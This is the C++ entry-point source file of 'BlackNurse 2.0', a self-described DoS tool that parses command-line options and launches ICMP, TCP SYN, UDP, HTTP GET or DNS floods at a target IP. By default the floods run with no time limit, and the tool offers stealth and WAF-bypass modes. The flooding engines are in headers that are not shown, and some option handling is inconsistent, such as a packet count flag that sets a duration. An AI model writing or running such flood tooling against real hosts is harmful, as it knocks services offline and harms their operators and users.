/**
 * BlackNurse 2.0 - DoS Testing Tool
 * 
 * Simple ICMP flood attack tool for network testing
 * 
 * Author: BlackNurse Project
 * Version: 2.0.0
 * Year: 
 */

#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <chrono>
#include <thread>
#include <atomic>
#include <random>
#include <algorithm>
#include <iomanip>
#include <csignal>
#include <cstring>
#include <unordered_map>
#include <sstream>

#include "common/config.hpp"
#include "common/logger.hpp"
#include "framework/framework_core.hpp"
#include "protocols/http_handler.hpp"
#include "protocols/tcp_handler.hpp"
#include "protocols/udp_handler.hpp"
#include "protocols/dns_handler.hpp"
#include "waf/waf_bypass_engine.hpp"
#include "stats/performance_monitor.hpp"
#include "network/socket_manager.hpp"
#include "network/packet_generator.hpp"

#ifdef ENABLE_CUDA
#include "gpu/cuda_accelerator.hpp"
#endif

using namespace blacknurse;
using namespace std::chrono_literals;

// Global variables for signal handling
std::atomic<bool> g_running{true};
std::unique_ptr<BlackNurse::FrameworkCore> g_framework;
std::unique_ptr<BlackNurse::PerformanceMonitor> g_performance_monitor;
std::unique_ptr<BlackNurse::WafBypassEngine> g_waf_engine;

void signal_handler(int signal) {
    if (signal == SIGINT || signal == SIGTERM) {
        std::cout << "\n\n[!] Received shutdown signal. Stopping framework...\n";
        g_running = false;
        
        if (g_framework) {
            g_framework->stop_attack();
            g_framework->shutdown();
        }
        
        // Simplified shutdown
        
        std::cout << "[+] Framework shutdown complete.\n";
        std::exit(0);
    }
}

void print_banner() {
    // Minimal banner like hping3
}

void print_usage(const char* program_name) {
    std::cout << "usage: " << program_name << " [options] target\n";
    std::cout << "  -h             show this help\n";
    std::cout << "  -v             verbose mode\n";
    std::cout << "  -c count       packet count\n";
    std::cout << "  -i interval    wait interval ms\n";
    std::cout << "  -s packetsize  packet size\n";
    std::cout << "  -t ttl         ttl\n";
    std::cout << "  -p protocol     protocol (icmp,tcp,udp,http,dns)\n";
    std::cout << "  -P port        target port\n";
    std::cout << "  --threads num  number of threads\n";
    std::cout << "  --rate pps     packets per second\n";
    std::cout << "  --stealth      enable stealth mode\n";
    std::cout << "  --waf-bypass   enable WAF bypass\n";
}

Config parse_arguments(int argc, char* argv[]) {
    Config config;
    
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        
        if (arg == "-h") {
            print_usage(argv[0]);
            std::exit(0);
        }
        else if (arg == "-v") {
            config.verbose = true;
        }
        else if (arg == "-c") {
            if (i + 1 < argc) {
                config.duration_seconds = std::stoi(argv[++i]);
            }
        }
        else if (arg == "-i") {
            if (i + 1 < argc) {
                int interval = std::stoi(argv[++i]);
                config.packets_per_second = interval > 0 ? 1000 / interval : 1000;
            }
        }
        else if (arg == "-s") {
            if (i + 1 < argc) {
                config.payload_size = std::stoi(argv[++i]);
            }
        }
        else if (arg == "-t") {
            if (i + 1 < argc) {
                config.ttl = std::stoi(argv[++i]);
            }
        }
        else if (arg == "-p") {
            if (i + 1 < argc) {
                config.protocol = argv[++i];
            }
        }
        else if (arg == "-P") {
            if (i + 1 < argc) {
                config.target_port = std::stoi(argv[++i]);
            }
        }
        else if (arg == "--threads") {
            if (i + 1 < argc) {
                config.thread_count = std::stoi(argv[++i]);
            }
        }
        else if (arg == "--rate") {
            if (i + 1 < argc) {
                config.packets_per_second = std::stoi(argv[++i]);
            }
        }
        else if (arg == "--stealth") {
            config.stealth_mode = true;
        }
        else if (arg == "--waf-bypass") {
            config.waf_bypass = true;
        }
        else if (arg[0] != '-') {
            config.target_ip = arg;
        }
    }
    
    if (config.target_ip.empty()) {
        print_usage(argv[0]);
        std::exit(1);
    }
    
    return config;
}

int main(int argc, char* argv[]) {
    try {
        print_banner();
        
        // Parse command line arguments
        Config config = parse_arguments(argc, argv);
        
        // Initialize logger
        Logger::init(config.verbose ? LogLevel::DEBUG : LogLevel::INFO);
        
        // Setup signal handlers
        std::signal(SIGINT, signal_handler);
        std::signal(SIGTERM, signal_handler);
        
        Logger::info("Starting BlackNurse Multi-Protocol Framework...");
        Logger::info("Target: " + config.target_ip + ":" + std::to_string(config.target_port));
        Logger::info("Protocol: " + config.protocol);
        Logger::info("Threads: " + std::to_string(config.thread_count));
        Logger::info("Rate: " + std::to_string(config.packets_per_second) + " pps");
        
        if (config.stealth_mode) {
            Logger::info("Stealth mode: ENABLED");
        }
        if (config.waf_bypass) {
            Logger::info("WAF bypass: ENABLED");
        }
        
        // Initialize multi-protocol framework
        g_framework = std::make_unique<BlackNurse::FrameworkCore>();
        
        // Initialize performance monitoring
        g_performance_monitor = std::make_unique<BlackNurse::PerformanceMonitor>(config.stats_interval);
        
        // Initialize WAF bypass engine if enabled
        if (config.waf_bypass) {
            g_waf_engine = std::make_unique<BlackNurse::WafBypassEngine>();
            Logger::info("WAF bypass engine initialized");
        }
        
        // Start performance monitoring
        g_performance_monitor->start();
        
        Logger::info("🚀 Starting multi-protocol attack framework...");
        Logger::warning("Press Ctrl+C to stop");
        
        // Start the framework
        g_framework->initialize(config);
        
        // Create multi-protocol attack config
        BlackNurse::AttackConfig attack_config;
        
        // Set attack type based on protocol
        if (config.protocol == "tcp") {
            attack_config.type = BlackNurse::AttackType::TCP_SYN_FLOOD;
        } else if (config.protocol == "udp") {
            attack_config.type = BlackNurse::AttackType::UDP_FLOOD;
        } else if (config.protocol == "http") {
            attack_config.type = BlackNurse::AttackType::HTTP_GET_FLOOD;
        } else if (config.protocol == "https") {
            attack_config.type = BlackNurse::AttackType::HTTP_GET_FLOOD;
        } else if (config.protocol == "dns") {
            attack_config.type = BlackNurse::AttackType::DNS_FLOOD;
        } else {
            attack_config.type = BlackNurse::AttackType::ICMP_FLOOD; // default
        }
        
        attack_config.rate_pps = config.packets_per_second;
        attack_config.duration_seconds = 0; // Infinite duration
        attack_config.thread_count = config.thread_count;
        attack_config.payload_size = config.payload_size;
        attack_config.use_gpu = config.use_gpu;
        attack_config.stealth_mode = config.stealth_mode;
        attack_config.adaptive_rate = config.adaptive_rate;
        
        g_framework->start_attack(attack_config);
        
        // Main loop
        auto start_time = std::chrono::steady_clock::now();
        while (g_running) {
            std::this_thread::sleep_for(100ms);
            
            // Check duration limit
            if (config.duration_seconds > 0) {
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - start_time
                ).count();
                
                if (elapsed >= config.duration_seconds) {
                    Logger::info("Duration limit reached, stopping framework");
                    break;
                }
            }
            
            // Update statistics
            g_performance_monitor->update(g_framework->get_stats());
        }
        
        // Stop the framework
        g_framework->stop_attack();
        g_framework->shutdown();
        g_performance_monitor->stop();
        
        // Print minimal statistics like hping3
        auto final_stats = g_framework->get_stats();
        if (config.verbose) {
            std::cout << "\n--- " << config.target_ip << " ping statistics ---\n";
            std::cout << final_stats.packets_sent << " packets transmitted\n";
        }
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}